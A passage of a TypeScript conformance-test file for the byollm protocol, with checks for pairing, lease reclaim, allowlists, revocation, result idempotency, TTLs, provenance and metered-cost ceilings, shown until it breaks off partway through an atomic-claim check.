import {
  AUDIENCES,
  OFFER_SCOPES,
  ClaimedStub,
  ENVELOPE_MAX_AGE_MS,
  keyId,
  open,
  seal,
  PROTOCOL_VERSION,
  PublicIdentity,
  generateKeys,
  publicIdentityOf,
  signRequest,
  verifyPublicIdentity,
  type MustId,
} from "@byollm/protocol";
import {
  advance,
  claimOne,
  claimRaw,
  fetchGenuine,
  postResult,
  fetchPayload,
  releaseLease,
  ownerIdFor,
  pairDaemon,
  sleep,
  waitFor,
} from "./harness.js";
import type { ConformanceTarget } from "./target.js";

/** One certification check. */
export interface Check {
  /** Stable id, cited in the report. */
  readonly id: string;
  /** What it proves, in one sentence. */
  readonly title: string;
  /** Which protocol MUSTs it asserts. */
  readonly musts: readonly MustId[];
  /** Throws to fail. */
  run(target: ConformanceTarget): Promise<void>;
}

function assert(condition: boolean, message: string): asserts condition {
  if (!condition) throw new Error(message);
}

const prompt = (text = "hello") => ({ prompt: text });

/**
 * The compatibility contract, as executable checks.
 *
 * A server is byollm-compatible when every one of these passes against it.
 * Each drives a **real daemon** — the shipped {@link Runner}, the shipped
 * pairing exchange, the shipped allowlist — so what is certified is the
 * behaviour of the pair, not one side's opinion of the other.
 */
export const CHECKS: readonly Check[] = [
  {
    id: "C001_PAIRING_BINDS_ONE_USER",
    title: "a runner token is bound to exactly the approving user",
    musts: ["PAIR_ONE_USER", "PAIR_INTERACTIVE"],
    async run(target: ConformanceTarget): Promise<void> {
      const alice = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        assert(
          alice.owner === (await ownerIdFor(target, "alice")),
          `runner was bound to "${alice.owner}", not to the approving user`,
        );

        // Alice's private job must not reach Bob's daemon.
        const bob = await pairDaemon(target, {
          owner: "bob",
          offer: "private",
        });
        assert(
          bob.owner !== alice.owner,
          "two different approvers produced the same runner owner",
        );
        try {
          const job = await target.enqueue({
            kind: "llm.generate",
            payload: prompt("alice's private prompt"),
            owner: "alice",
            audience: "private",
          });
          await bob.runner.tick();
          await sleep(50);
          const state = await target.job(job.id);
          assert(
            state?.state === "queued",
            `another user's daemon took a self job (state: ${String(state?.state)})`,
          );
        } finally {
          await bob.dispose();
        }
      } finally {
        await alice.dispose();
      }
    },
  },

  {
    id: "C002_JOB_ROUND_TRIP",
    title:
      "an enqueued job runs on the owner's daemon and the result comes back",
    musts: ["CLAIM_REQUIRES_CAPABILITY", "RESULT_IDEMPOTENT"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("summarise this"),
          owner: "alice",
        });

        await daemon.runner.tick();
        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
          what: "the job to complete",
        });

        const finished = await target.job(job.id);
        assert(
          finished?.outcome?.text === "echo: summarise this",
          "the result text did not survive the round trip",
        );
        assert(
          daemon.backend.seen[0] === "summarise this",
          "the prompt did not reach the model verbatim",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C003_UNKNOWN_KIND_REFUSED",
    title: "a daemon is never handed a kind it did not advertise",
    musts: ["KIND_TYPED_ONLY", "CLAIM_REQUIRES_CAPABILITY"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        // The server must match against the matrix in the claim request, so a
        // job for a kind the daemon does not offer is simply never returned.
        const job = await target.enqueue({
          kind: "llm.chat",
          payload: { messages: [{ role: "user", content: "hi" }] },
          owner: "alice",
        });
        const before = daemon.backend.seen.length;
        await daemon.runner.tick();
        await sleep(50);

        const state = await target.job(job.id);
        // This daemon *does* advertise llm.chat, so it should run — the
        // negative case is covered by the capability filter below.
        assert(
          state?.state === "ok" ||
            state?.state === "running" ||
            state?.state === "claimed",
          `a job for an advertised kind was not taken (state: ${String(state?.state)})`,
        );
        assert(
          daemon.backend.seen.length > before,
          "the advertised kind never reached the backend",
        );

        // The negative, which this check's own comment claimed was "covered
        // by the capability filter below" and which was not below or anywhere
        // — cloud_008 Tier 3. It asserted only that an advertised kind runs,
        // under a title about a kind never being handed over, citing
        // `CLAIM_REQUIRES_CAPABILITY` while never withholding anything.
        //
        // Claimed raw, advertising one kind, so the *server's* matching is
        // what decides. Through a daemon this proves nothing: a daemon
        // refuses a kind it has no route for, and the job stays queued either
        // way.
        const chat = await target.enqueue({
          kind: "llm.chat",
          payload: { messages: [{ role: "user", content: "not for you" }] },
          owner: "alice",
        });
        const generateOnly = await claimRaw(target, daemon, [
          {
            kind: "llm.generate",
            service: "local",
            isDefault: true,
            backendId: "openai-http",
            backendClass: "http",
            model: "echo-model",
            offerScope: "private",
          },
        ]);
        assert(
          !generateOnly.some((offered) => offered.id === chat.id),
          "a server offered `llm.chat` to a claim advertising only `llm.generate`",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C004_LEASE_RECLAIM",
    title: "a job whose runner vanished is offered again, losing nothing",
    musts: ["LEASE_RECLAIMABLE", "LEASE_HONORED"],
    async run(target: ConformanceTarget): Promise<void> {
      const dead = await pairDaemon(target, {
        owner: "alice",
        label: "dead",
        offer: "private",
      });
      const job = await target.enqueue({
        kind: "llm.generate",
        payload: prompt("work"),
        owner: "alice",
      });

      // Claim it, then stop existing — no release, no heartbeat.
      dead.backend.hangMs = 60_000;
      const firstLease = await claimOne(target, dead);
      await waitFor(
        async () => {
          const state = await target.job(job.id);
          return state?.state === "claimed" || state?.state === "running";
        },
        { what: "the job to be claimed" },
      );
      // kill -9: no release, no heartbeat, no result. Cancelling instead
      // would make the backend report `canceled` and the job would reach a
      // terminal state, which is the opposite of what reclaim is about.
      await dead.abandon();

      // Once the lease lapses the job must be claimable again.
      await advance(target, target.leaseMs + 500);

      const alive = await pairDaemon(target, {
        owner: "alice",
        label: "alive",
        offer: "private",
      });
      try {
        // The stale-holder case goes **here**, while the reclaimed job is
        // still live — cloud_008 Tier 3, and this is the third time in this
        // file that ordering decided which rule a test observes.
        //
        // Written after the reclaiming daemon finished, it proved nothing:
        // §3.6 checks terminal state before the holder, so a submission
        // against a completed job is refused as not-current regardless of who
        // holds it, and deleting the holder check failed nothing. A stale
        // holder is only *stale* while somebody else's grant is live.
        const reclaimed = await claimOne(target, alive);
        assert(
          reclaimed.id === job.id,
          "the reclaiming daemon did not get the job",
        );

        // `LEASE_HONORED`, which this check has cited since it was written
        // and never exercised — cloud_008 Tier 3. Reclaim is
        // `LEASE_RECLAIMABLE`; the dead daemon never submitted anything, so
        // nothing here ever asked whether a stale holder may write.
        //
        // It is the natural end of this check's own story. The machine that
        // vanished comes back, finishes the work it started, and submits
        // under the grant it still believes it holds — which is not
        // hypothetical, it is what a laptop that slept does.
        const late = await postResult(target, dead, {
          jobId: job.id,
          leaseId: firstLease.lease.id,
          outcome: { outcome: "ok", text: "from the machine that vanished" },
        });
        const lateBody = (await late.json().catch(() => ({}))) as {
          accepted?: boolean;
        };
        assert(
          lateBody.accepted !== true,
          "a site accepted a result from a runner whose lease had lapsed",
        );

        const midflight = await target.job(job.id);
        assert(
          !midflight?.outcome,
          "a lapsed holder's result was recorded over a live grant",
        );

        // And the current holder still finishes it — a refusal that also
        // broke the reclaim would pass every assertion above.
        const proper = await postResult(target, alive, {
          jobId: job.id,
          leaseId: reclaimed.lease.id,
          outcome: { outcome: "ok", text: "from the machine that took over" },
        });
        assert(
          proper.status === 200,
          `the reclaiming daemon could not finish the job (${String(proper.status)})`,
        );
        const final = await target.job(job.id);
        assert(
          final?.outcome?.text === "from the machine that took over",
          "the reclaimed job did not record the current holder's result",
        );
      } finally {
        await alive.dispose();
        await dead.dispose();
      }
    },
  },

  {
    id: "C005_AUDIENCE_MATRIX",
    title: "all four audience x offer-scope combinations behave as specified",
    musts: ["AUDIENCE_BOTH_SIDES", "NAMED_LOCAL_ALLOWLIST"],
    async run(target: ConformanceTarget): Promise<void> {
      // Expected outcome for a job owned by `alice` offered to `bob`'s daemon
      // whose local allowlist is empty.
      // Keyed `audience:offer`, in the one vocabulary both axes now speak.
      //
      // **Every cell is `false`**, and that is the property rather than an
      // oddity of the table. `public` was removed on 2026-08-26 because it
      // was the one offer scope that returned ALLOWED *without consulting the
      // device*; the two `true` cells here were both its doing. A matrix with
      // no `true` in it is a matrix in which a stranger's job cannot run
      // until something this device verified says so, and C006 is where that
      // something is supplied and named.
      const expected: Record<string, boolean> = {
        "private:private": false,
        "private:team": false,
        "team:private": false,
        "team:team": false, // refused locally — nothing admits alice
      };

      for (const audience of AUDIENCES) {
        for (const offer of OFFER_SCOPES) {
          await target.reset();
          const bob = await pairDaemon(target, { owner: "bob", offer });
          try {
            const job = await target.enqueue({
              kind: "llm.generate",
              payload: prompt("community work"),
              owner: "alice",
              audience,
            });

            await bob.runner.tick();
            await sleep(80);
            const state = await target.job(job.id);
            const ran = state?.state === "ok";
            const shouldRun = expected[`${audience}:${offer}`] ?? false;

            assert(
              ran === shouldRun,
              `audience=${audience} offer=${offer}: expected ` +
                `${shouldRun ? "to run" : "to be refused"}, got state ` +
                `"${String(state?.state)}"`,
            );
          } finally {
            await bob.dispose();
          }
        }
      }
    },
  },

  {
    id: "C006_NAMED_LOCAL_ALLOWLIST",
    /**
     * Renamed with the release that made the sentence true — Amendment G, B2.
     *
     * The old title read "a named job runs only once the daemon's own
     * allowlist admits it", which was true only under a generous reading of
     * "own": the list was per-person and local, and a team member had to be
     * enrolled on every machine by hand.
     *
     * The id does not change, per the id-stability law. What changes is the
     * sentence, and it now names all three of the things a reader would
     * otherwise take on faith — that the list is local, that its authority was
     * established out of band, and that admission is a property of the asker
     * rather than of the request.
     */
    title:
      "a team job runs only once a roster this daemon holds, signed by a " +
      "key it pinned at pairing, admits the asker",
    musts: ["NAMED_LOCAL_ALLOWLIST", "REFUSAL_NOT_REOFFERED"],
    async run(target: ConformanceTarget): Promise<void> {
      const bob = await pairDaemon(target, { owner: "bob", offer: "team" });
      try {
        const refused = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("before"),
          owner: "alice",
          audience: "team",
        });

        await bob.runner.tick();
        await sleep(80);
        assert(
          (await target.job(refused.id))?.state !== "ok",
          "a named job ran without the daemon's local allowlist admitting it",
        );

        // `REFUSAL_NOT_REOFFERED`, watched at the offer rather than at the
        // backend — cloud_008 Tier 3, finding 13.
        //
        // This asserted `bob.backend.seen.length` had not grown, which is
        // true whether or not the server remembers the refusal: the daemon
        // declines this job at `admit`, before anything is executed, so a
        // re-offered job reaches the backend exactly as often as a withheld
        // one — never. The check observed a place the job could not arrive.
        //
        // A raw claim is the seam. It runs no daemon admission logic, so what
        // comes back is what the server was still willing to hand over, and
        // the server's memory of the refusal is the only thing that can
        // withhold it.
        const reoffered = await claimRaw(target, bob);
        assert(
          !reoffered.some((job) => job.id === refused.id),
          "a server re-offered a job to the runner that refused it",
        );

        // Now the owner allows alice, locally — by the id this server uses
        // for her, because that is what arrives on the wire.
        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const allowed = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("after"),
          owner: "alice",
          audience: "team",
        });
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(allowed.id))?.state === "ok",
          { what: "the allowed named job to run" },
        );
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C007_SUBSCRIPTION_SELF_LOCK",
    title:
      "a subscription backend refuses another user's work at any configured scope",
    musts: ["SUBSCRIPTION_SELF_LOCK"],
    async run(target: ConformanceTarget): Promise<void> {
      // Bob's config asks for `public` on a subscription-class backend. The
      // lock must win, on both sides.
      const bob = await pairDaemon(target, {
        owner: "bob",
        offer: "team",
        subscription: true,
      });
      try {
        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("someone else's work"),
          owner: "alice",
          audience: "team",
        });

        await bob.runner.tick();
        await sleep(80);
        const state = await target.job(job.id);
        assert(
          state?.state !== "ok",
          "a subscription backend ran another user's job",
        );
        assert(
          bob.backend.seen.length === 0,
          "another user's prompt reached a subscription backend",
        );

        // The owner's own work still runs on it.
        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own work"),
          owner: "bob",
          audience: "private",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the owner's own subscription job to run",
        });
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C008_REVOCATION",
    title: "a revoked daemon stops mid-queue",
    // Both halves, and this check already proved both: the daemon learns it
    // is revoked (`REVOCATION_HONORED`), *and* the upstream leaves the job
    // queued rather than granting it (`REVOCATION_IMMEDIATE`). The second
    // assertion was here and cited nothing — which is how a MUST comes to be
    // declared in a spec, absent from the registry, and tested all along.
    musts: ["REVOCATION_HONORED", "REVOCATION_IMMEDIATE"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        await target.revokeRunner(daemon.runnerId);

        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("after revocation"),
          owner: "alice",
        });

        await daemon.runner.tick();
        await sleep(80);

        assert(
          daemon.runner.status().revoked,
          "the daemon did not learn it was revoked",
        );
        assert(
          (await target.job(job.id))?.state === "queued",
          "a revoked daemon took new work",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C009_CANCEL_MID_FLIGHT",
    title: "cancel aborts a running job's backend call",
    musts: ["CANCEL_HONORED"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        daemon.backend.hangMs = 30_000;
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("long job"),
          owner: "alice",
        });

        await daemon.runner.tick();
        await waitFor(() => daemon.backend.seen.length > 0, {
          what: "the job to start running",
        });

        await target.cancelJob(job.id);
        // The cancel travels on the next heartbeat.
        await daemon.runner.tick();

        await waitFor(
          async () => (await target.job(job.id))?.state === "canceled",
          { what: "the job to report canceled", timeoutMs: 10_000 },
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C010_RESULT_IDEMPOTENT",
    title: "the first terminal outcome wins",
    musts: ["RESULT_IDEMPOTENT"],
    async run(target: ConformanceTarget): Promise<void> {
      // cloud_008 Tier 3. This used to post a duplicate with no envelope, no
      // lease and no signature, and then say so in a comment —
      // "unauthenticated here, so it is refused before it can matter". It was
      // refused for being unsigned, never for being a duplicate, so
      // `RESULT_IDEMPOTENT` was never exercised. The body still carried
      // `model` and `durationMs` two alphas after those left the wire, which
      // is what a request nobody parses looks like.
      //
      // Both submissions are now signed, sealed and under the same grant —
      // the shape a retrying daemon actually produces, and the only shape
      // that reaches the idempotency branch at all. A replay under a
      // *different* grant is a different rule (`LEASE_HONORED`, §1.4a) and
      // would be refused before idempotency was consulted.
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("once"),
          owner: "alice",
        });

        // Claimed directly rather than by ticking the runner, because this
        // check needs the lease the grant was issued under.
        const claimed = await claimOne(target, daemon);
        assert(claimed.id === job.id, "the harness could not claim its job");

        const first = await postResult(target, daemon, {
          jobId: job.id,
          leaseId: claimed.lease.id,
          outcome: { outcome: "ok", text: "the answer that counts" },
        });
        assert(
          first.status === 200,
          `a site refused the first result (${String(first.status)})`,
        );

        const replay = await postResult(target, daemon, {
          jobId: job.id,
          leaseId: claimed.lease.id,
          outcome: { outcome: "ok", text: "SECOND ANSWER" },
        });

        // Accepted as a request, and a no-op as a write. A site that answered
        // an error would make a retrying daemon retry forever.
        assert(
          replay.status === 200,
          `a replayed result was rejected rather than ignored (${String(replay.status)})`,
        );
        const body = (await replay.json()) as {
          accepted?: boolean;
          duplicate?: boolean;
        };
        assert(
          body.accepted === false,
          "a site reported a replayed result as newly accepted",
        );

        // `duplicate`, not a stale-lease refusal — cloud_008 §3.6. The
        // device whose acknowledgment was lost is told its answer is already
        // recorded; the other message would invent a worry about a result
        // that is safely on disk.
        assert(
          body.duplicate === true,
          "a replay from the device that finished the job was not called a duplicate",
        );

        // The property, not the boolean: the first answer is what survived.
        const after = await target.job(job.id);
        assert(
          after?.outcome?.text === "the answer that counts",
          `a second result overwrote the first (${String(after?.outcome?.text)})`,
        );

        // A *different* device, signed and sealed, submitting for a job that
        // is already terminal. It must get exactly the refusal it would get
        // for a job that is not terminal — otherwise the two answers differ
        // and a job id becomes a terminality probe: anyone holding an id
        // could learn whether the work had finished by watching which
        // rejection came back.
        const stranger = await pairDaemon(target, {
          owner: "alice",
          offer: "private",
        });
        try {
          const foreign = await postResult(target, stranger, {
            jobId: job.id,
            leaseId: claimed.lease.id,
            outcome: { outcome: "ok", text: "not this device's to answer" },
          });
          const foreignBody = (await foreign
            .json()
            .catch(() => ({}))) as Record<string, unknown>;
          assert(
            foreignBody["duplicate"] !== true,
            "a site told a device that never held this job it was a duplicate",
          );
          const stillFirst = await target.job(job.id);
          assert(
            stillFirst?.outcome?.text === "the answer that counts",
            "a stranger's result overwrote a terminal job",
          );
        } finally {
          await stranger.dispose();
        }
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C011_DEPENDENCY_ORDER",
    title: "a dependent job waits for its dependency, across two daemons",
    musts: ["DEPENDS_ON_GATING", "TTL_EXPIRY"],
    async run(target: ConformanceTarget): Promise<void> {
      // The Press-shaped case from byollm_001 Rev 1 §E: two halves of one
      // piece of work, owned by different people, landing on different
      // machines, in order.
      const alice = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      const bob = await pairDaemon(target, { owner: "bob", offer: "private" });
      try {
        const first = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("step one"),
          owner: "bob",
          audience: "private",
        });
        const second = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("step two"),
          owner: "alice",
          audience: "private",
          dependsOn: [first.id],
        });

        // Alice's daemon must not be able to start the dependent job yet.
        await alice.runner.tick();
        await sleep(80);
        assert(
          alice.backend.seen.length === 0,
          "a dependent job ran before its dependency completed",
        );
        assert(
          (await target.job(second.id))?.state === "queued",
          "a dependent job left the queue early",
        );

        // Bob's daemon does step one.
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(first.id))?.state === "ok",
          { what: "the dependency to complete" },
        );

        // Now step two becomes available to Alice's.
        await alice.runner.tick();
        await waitFor(
          async () => (await target.job(second.id))?.state === "ok",
          { what: "the dependent job to complete" },
        );
      } finally {
        await alice.dispose();
        await bob.dispose();
      }
    },
  },

  {
    id: "C012_TTL_AND_NO_RUNNER",
    title:
      "an unclaimed job expires and no-runner is surfaced, but not while blocked",
    musts: ["TTL_EXPIRY", "NO_RUNNER_SIGNAL"],
    async run(target: ConformanceTarget): Promise<void> {
      // Nothing paired at all.
      const availability = await target.runnerAvailability({
        kind: "llm.generate",
        owner: "alice",
      });
      assert(
        !availability.available,
        "no-runner was not surfaced with nothing paired",
      );

      const job = await target.enqueue({
        kind: "llm.generate",
        payload: prompt("nobody will run this"),
        owner: "alice",
        ttlMs: target.ttlMs,
      });

      await advance(target, target.ttlMs + 500);
      const state = await target.job(job.id);
      assert(
        state?.state === "expired",
        `an unclaimed job past its TTL was "${String(state?.state)}", not expired`,
      );
    },
  },

  {
    id: "C013_TTL_CLOCK_STARTS_WHEN_CLAIMABLE",
    title:
      "a dependent job's TTL starts when it becomes claimable, not at enqueue",
    musts: ["TTL_EXPIRY"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      try {
        // The dependency is held open past the dependent's whole TTL.
        daemon.backend.hangMs = target.ttlMs * 2;
        const first = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("slow step"),
          owner: "alice",
        });
        const second = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("waiting step"),
          owner: "alice",
          dependsOn: [first.id],
          ttlMs: target.ttlMs,
        });

        await daemon.runner.tick();
        await advance(target, target.ttlMs + 200);

        const blocked = await target.job(second.id);
        assert(
          blocked?.state === "queued",
          `a blocked job expired while waiting on its dependency ` +
            `(state: ${String(blocked?.state)}) — the TTL clock started too early`,
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C014_RESULT_PROVENANCE",
    title:
      "a community result arrives marked untrusted, a self result does not",
    // `PROVENANCE_NAMES_DEVICE` supersedes `RESULT_PROVENANCE` — a
    // strengthening rather than a rename. C030 is the other half: a label
    // means nothing unless a result whose signature does not verify against
    // the granted device is refused rather than recorded.
    musts: ["PROVENANCE_NAMES_DEVICE"],
    async run(target: ConformanceTarget): Promise<void> {
      const bob = await pairDaemon(target, { owner: "bob", offer: "team" });
      try {
        // Admitted explicitly. This check offered `public` until 2026-08-26,
        // which meant the provenance assertion below was reached without the
        // device ever deciding anything — the claim was about a label on a
        // result, and the path to it skipped the step that makes the label
        // meaningful.
        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );
        const community = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("run this anywhere"),
          owner: "alice",
          audience: "team",
        });
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(community.id))?.state === "ok",
          { what: "the community job to complete" },
        );

        const delivered = await target.job(community.id);
        assert(
          delivered?.provenance?.untrusted === true,
          "a shared result was not marked untrusted",
        );
        // `delivered.provenance` is already narrowed by the assertion above.
        assert(
          delivered.provenance.runnerOwner === "bob",
          "the result did not carry the runner's owner",
        );

        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own"),
          owner: "bob",
          audience: "private",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the self job to complete",
        });
        assert(
          (await target.job(own.id))?.provenance?.untrusted === false,
          "a self result was marked untrusted",
        );
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C015_INGRESS_BEFORE_EXECUTION",
    title: "every executed prompt is in the ingress log before it runs",
    musts: ["INGRESS_LOGGED_BEFORE_EXECUTION"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, {
        owner: "alice",
        offer: "private",
      });
      let ticking: Promise<unknown> = Promise.resolve();
      try {
        // The ordering is the MUST, and it is not decoration. The daemon is
        // the owner's trust anchor: `byollm log` promises every prompt that
        // ran here, ever. A daemon that logged after execution would keep that
        // promise until the first crash, kill, or power cut mid-job — and lose
        // exactly the prompt someone would want to look up.
        //
        // Checked while the backend is still running, because after completion
        // both orderings look identical. An earlier version of this check
        // waited for the job to finish and so could not tell them apart:
        // moving the log call after the backend call left it passing.
        daemon.backend.hangMs = 30_000;

        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("logged prompt"),
          owner: "alice",
        });
        // Deliberately not awaited: the backend is hanging, so this tick does
        // not settle until `dispose` cancels it. Kept and awaited in the
        // `finally`, because a discarded rejection here would surface as an
        // unhandled rejection in whatever test ran next.
        ticking = daemon.runner.tick().catch(() => undefined);

        // Execution has demonstrably begun: the backend has the prompt.
        await waitFor(() => Promise.resolve(daemon.backend.seen.length > 0), {
          what: "the backend to be called",
        });

        const during = await daemon.ingress.read();
        const logged = during.find(
          (entry) => entry.type === "prompt" && entry.jobId === job.id,
        );
        assert(
          logged !== undefined,
          "a prompt reached the backend before it reached the ingress log",
        );
        assert(
          logged.type === "prompt" && logged.prompt === "logged prompt",
          "the ingress log did not record the prompt text",
        );
      } finally {
        await daemon.dispose();
        await ticking;
      }
    },
  },

  {
    id: "C016_UNAUTHENTICATED_REFUSED",
    title: "the protocol endpoints refuse an unknown token",
    // `CONSENT_BEFORE_ROUTE` on this plane. A relay has a consent record; a
    // direct site has pairing, and it is the same obligation — an upstream
    // routes to a device it has a record binding, and there is no discovery
    // path by which an unbound device receives work. Every endpoint is
    // checked rather than just `claim`, which is what makes it the absence
    // of a path rather than the absence of one door.
    musts: ["PAIR_ONE_USER", "CONSENT_BEFORE_ROUTE"],
    async run(target: ConformanceTarget): Promise<void> {
      for (const endpoint of ["claim", "heartbeat", "result", "release"]) {
        const response = await target.fetch(
          new Request(`${target.origin}/byollm/${endpoint}`, {
            method: "POST",
            headers: {
              "content-type": "application/json",
              authorization: "Bearer definitely-not-a-real-token",
            },
            body: JSON.stringify({ protocolVersion: "0" }),
          }),
        );
        assert(
          response.status === 401,
          `${endpoint} answered ${String(response.status)} to an unknown token, not 401`,
        );
      }
    },
  },

  {
    id: "C017_METERED_DEFAULTS_SELF",
    title:
      "a paid backend is not shared until its owner says so, with a ceiling",
    // `EFFECTIVE_OFFER_ONLY` too: bob asks for `public`, what reaches the
    // server is `self`, and the server acts on what it was told rather than
    // on what was wanted. That *is* the effective-offer rule, proved here
    // without being named.
    musts: [
      "METERED_DEFAULTS_SELF",
      "COST_NOT_CONFIGURABLE",
      "EFFECTIVE_OFFER_ONLY",
    ],
    async run(target: ConformanceTarget): Promise<void> {
      // Bob asks for `public` on a metered provider and says nothing about
      // spending. The ask is not honoured: what reaches the server is `self`,
      // and the server must act on what it was told.
      const bob = await pairDaemon(target, {
        owner: "bob",
        offer: "team",
        // Pointed at localhost — which changes nothing, because a named
        // provider's cost comes from the registry, not from an address
        // ({@link MUSTS.COST_NOT_CONFIGURABLE}).
        metered: { provider: "openai", baseUrl: "http://127.0.0.1:11434/v1" },
      });
      try {
        assert(
          bob.loaded.routes.every((route) => route.offerScope === "private"),
          "a metered backend was advertised beyond its owner without consent",
        );
        assert(
          bob.loaded.routes.every((route) => route.cost === "metered"),
          "a metered provider was read as free because of its base URL",
        );

        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("spend someone else's money"),
          owner: "alice",
          audience: "team",
        });

        await bob.runner.tick();
        await sleep(80);
        const state = await target.job(job.id);
        assert(
          state?.state !== "ok",
          "a stranger's job ran on a paid backend nobody agreed to share",
        );
        assert(
          bob.backend.seen.length === 0,
          "a stranger's prompt reached a paid backend",
        );

        // And the server says so up front, rather than promising a runner
        // that would refuse ({@link MUSTS.NO_RUNNER_SIGNAL}).
        const availability = await target.runnerAvailability({
          kind: "llm.generate",
          owner: "alice",
          audience: "team",
        });
        assert(
          !availability.available,
          "the server offered a runner that will not take the work",
        );

        // Bob's own work still runs. Narrowing is not disabling.
        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own work"),
          owner: "bob",
          audience: "private",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the owner's own metered job to run",
        });
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C018_METERED_CEILING",
    title: "a shared paid backend runs others' work, and stops at its ceiling",
    musts: ["METERED_REQUIRES_CEILING", "REMOTE_IS_NEVER_FREE"],
    async run(target: ConformanceTarget): Promise<void> {
      // This time Bob means it: consent, and a number.
      const bob = await pairDaemon(target, {
        owner: "bob",
        offer: "team",
        metered: {
          // The generic backend pointed at a remote address. No registry entry
          // says what this costs; it is metered because of where it goes
          // ({@link MUSTS.REMOTE_IS_NEVER_FREE}).
          provider: "openai-http",
          baseUrl: "https://models.example.com/v1",
          acknowledged: true,
          dailyCapCents: 500,
        },
      });
      try {
        assert(
          bob.loaded.routes.every((route) => route.cost === "metered"),
          "a remote backend was treated as free",
        );
        assert(
          bob.loaded.routes.every((route) => route.offerScope === "team"),
          "a deliberately shared metered backend was narrowed anyway",
        );

        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const first = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("work bob agreed to pay for"),
          owner: "alice",
          audience: "team",
        });
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(first.id))?.state === "ok",
          { what: "a consented metered job to run" },
        );

        // Now spend the day's ceiling.
        await bob.spend.record("primary", 900, Date.now());

        const second = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("work past the ceiling"),
          owner: "alice",
          audience: "team",
        });
        const seenBefore = bob.backend.seen.length;
        await bob.runner.tick();
        await sleep(80);
        const state = await target.job(second.id);
        assert(
          state?.state !== "ok",
          "a paid backend kept working past the ceiling its owner set",
        );
        assert(
          bob.backend.seen.length === seenBefore,
          "a prompt reached a paid backend that had spent its ceiling",
        );

        // The ceiling governs other people's work, not the owner's own.
        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own work, my own key"),
          owner: "bob",
          audience: "private",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the owner's own job to run past the community ceiling",
        });
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C019_CLAIM_ATOMIC",
    title: "two runners racing one job — exactly one gets it",
    musts: ["CLAIM_ATOMIC"],
    async run(target: ConformanceTarget): Promise<void> {
      // The check most likely to catch a real store bug. A Postgres adapter
      // without `FOR UPDATE SKIP LOCKED`, or a memory store with an `await`
      // between "read queued" and "write claimed", passes every other check
      // in this kit and double-runs jobs the moment two daemons are online.
      // The user sees one prompt answered twice and pays for it twice.
      const a = await pairDaemon(target, {
        owner: "alice",
        label: "laptop",
        offer: "private",
      });
      const b = await pairDaemon(target, {
        owner: "alice",
        label: "desktop",
        offer: "private",
      });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("only once, please"),
          owner: "alice",
          audience: "private",
        });

        // Concurrently, not in sequence — sequential ticks would pass against
        // a store with no atomicity at all.
        await Promise.all([a.runner.tick(), b.runner.tick()]);
